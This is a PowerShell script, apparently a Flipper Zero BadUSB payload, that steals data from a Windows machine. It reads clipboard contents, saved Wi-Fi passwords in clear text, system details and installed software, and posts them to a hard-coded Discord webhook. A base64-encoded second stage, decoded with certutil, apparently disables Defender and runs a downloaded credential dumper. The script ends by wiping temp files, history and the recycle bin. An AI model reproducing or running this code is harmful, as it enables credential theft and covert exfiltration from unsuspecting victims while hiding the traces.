#CHANGE URL TO YOUR URL
  $url="https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f" ;
#Get PC Name+Date+Time
  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S";

# Get PC ClipBoard
  echo "" > "$env:temp\stats-$namepc.txt";
  echo "####PC ClipBoard under this line:" >> "$env:temp\stats-$namepc.txt";
  echo "####################################" >> "$env:temp\stats-$namepc.txt";
  Get-Clipboard >> "$env:temp\stats-$namepc.txt";
  echo "####################################" >> "$env:temp\stats-$namepc.txt";
  echo "####End ClipBoard" >> "$env:temp\stats-$namepc.txt";

# Get WifiPassword
echo "" > "$env:temp\WIFI-$namepc.txt";
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";

# Get PC information
  dir env: >> "$env:temp\stats-$namepc.txt";
# List which AntiVirus Product is being used
  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> "$env:temp\stats-$namepc.txt";
# Get public IP
  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
  echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
# Get Local IP
  ipconfig /all >> "$env:temp\stats-$namepc.txt";
# List all installed Software
  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";

#UPLOAD
cd $env:temp;
# Send Name Computer to discord
  $Body=@{ content = "**Stats from Flipper-Zero on user:** $env:UserName, on pc: $env:computername"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
# Upload Stat
  curl.exe -F "file1=@stats-$namepc.txt" $url;
# Upload wifi password
  curl.exe -F "file2=@WIFI-$namepc.txt" $url;

#Delete all file
# Delete stat
  Remove-Item "stats-$namepc.txt" -Force -Recurse;
# Delete wifi password
  Remove-Item "WIFI-$namepc.txt" -Force -Recurse;
# Delete this script
  Remove-Item  $env:temp\p.ps1 -Force -Recurse;
# Delete screencapture script
  Remove-Item $env:temp\d.ps1 -Force -Recurse;

#PSW Xfil
  $webhook = "https://discord.com/api/webhooks/1258951712375570523/ZzVRGI8GumQjTSz_s2geTSXNsk0tE9zp5_56xGu9u2GEHwjLmXhsYPL4G4GMYGmjOC3f";
  $version = "2.4.5";
  $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo 77u/JElzQWRtaW4gPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQ0KJEFkbWluID0gJElzQWRtaW4uSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGRpciA9ICIkZW52OnRlbXBcSkhrbmZ1aUQiDQppZiAoIShUZXN0LVBhdGggLVBhdGggIiRkaXIiKSkgew0KTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAiJGRpciINCn0NCmlmICgtbm90ICR2ZXJzaW9uKSB7DQogICR2ZXJzaW9uID0gIjIuNC41Ig0KfQ0KJGxvZyA9ICIkZGlyXG91dHB1dC50eHQiDQokbmV4dGRvb3IgPSAiZ2l0aHViLmNvbSINCiR2ZXJtID0gInYkdmVyc2lvbiINCiRjdXBpZCA9ICJUaGUgTEFaeSBtYWpvciB3YXMgZml4aW5nIEN1cGlk4oCZcyBicm9rZW4gcXVpdmVyLiINCiRsYXp5ID0gIlF1aWNrIGJyb3duIGZveCBqdW1wcyBvdmVyIHRoZSBsYXp5IGRvZy4iDQokZXggPSAiLmV4ZSINCiRhID0gIjoiDQokYiA9ICIvIg0KJGMgPSAkY3VwaWQuU3Vic3RyaW5nKDEsMSkNCiRkID0gJGxhenkuU3Vic3RyaW5nKDI3LDEpDQokZSA9ICRjdXBpZC5TdWJzdHJpbmcoMjgsMSkNCiRmID0gJGN1cGlkLlN1YnN0cmluZygxNywxKQ0KJGcgPSAkY3VwaWQuU3Vic3RyaW5nKDUsMSkNCiRoID0gJGxhenkuU3Vic3RyaW5nKDMxLDEpDQokaSA9ICRjdXBpZC5TdWJzdHJpbmcoMiwxKQ0KJGogPSAkbGF6eS5TdWJzdHJpbmcoMzIsMSkNCiRrID0gJGxhenkuU3Vic3RyaW5nKDEwLDEpDQokbCA9ICRjdXBpZC5TdWJzdHJpbmcoMzAsMSkNCiRtID0gJGxhenkuU3Vic3RyaW5nKDcsMSkNCiRuID0gJGxhenkuU3Vic3RyaW5nKDgsMSkNCiRvID0gJGN1cGlkLlN1YnN0cmluZyg2LDEpDQokcCA9ICRjdXBpZC5TdWJzdHJpbmcoNCwxKQ0KJHEgPSAkY3VwaWQuU3Vic3RyaW5nKDI0LDEpDQokciA9ICRsYXp5LlN1YnN0cmluZyg5LDEpDQokZGVtb24gPSAiJGMkZCRkJGUkZiRhJGIkYiRuZXh0ZG9vciRiIg0KJGFuZ2VsID0gIiRnJGgkaSRmJGYkaiRrJGwkbSRuJG8kYiRwJGokbyRqJHEkayRpJGIkbSRpJGgkaSRqJGYkaSRmJGIkbCRuJHIkayRoJG4kaiRsJGIiDQokaHVtYW4gPSAiJHZlcm0kYiRwJGokbyRqJHEkayRpJGV4Ig0KJHplbGRhID0gIiRkZW1vbiRhbmdlbCRodW1hbiIgfCBPdXQtU3RyaW5nDQpXcml0ZS1Ib3N0ICR6ZWxkYQ0KaWYgKCRBZG1pbiAtZXEgJ1RydWUnKSB7DQogIFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWUNCg0KICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICIkZGlyIg0KfQ0KJGhpZGUgPSBHZXQtSXRlbSAiJGRpciIgLUZvcmNlDQokaGlkZS5hdHRyaWJ1dGVzPSdIaWRkZW4nDQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICIkemVsZGEiIC1PdXRGaWxlICIkZGlyXGxhemFnbmUuZXhlIg0KJiAiJGRpclxsYXphZ25lLmV4ZSIgYWxsID4gIiRsb2ciDQpjdXJsLmV4ZSAtRiAicGF5bG9hZF9qc29uPXtcYCJ1c2VybmFtZVxgIjogXGAiJGVudjpDb21wdXRlck5hbWVcYCIsIFxgImNvbnRlbnRcYCI6IFxgIk5ldyBGaWxlIFVwbG9hZGVkYCFcbihBZG1pbjogJEFkbWluKSBcYCJ9IiAtRiAiZmlsZT1AXGAiJGxvZ1xgIiIgJHdlYmhvb2sgPiRudWxsIDI+JjENClN0YXJ0LVNsZWVwIC1TZWNvbmRzIDIwDQppZiAoJEFkbWluIC1lcSAnVHJ1ZScpew0KICBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICRmYWxzZQ0KDQogIFJlbW92ZS1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggIiRkaXIiDQp9DQokdW5oaWRlID0gR2V0LUl0ZW0gIiRkaXIiIC1Gb3JjZQ0KJHVuaGlkZS5hdHRyaWJ1dGVzPSdOb3JtYWwnDQpSZW1vdmUtSXRlbSAtUGF0aCAiJGRpciIgLVJlY3Vyc2UgLUZvcmNl > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1";


# 1empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue;

# 1delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f ;

# 1Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue;

# 1Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue;

#Last discord kill before quit
taskkill /IM Discord.exe /F;

# Clear History powershell:
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;

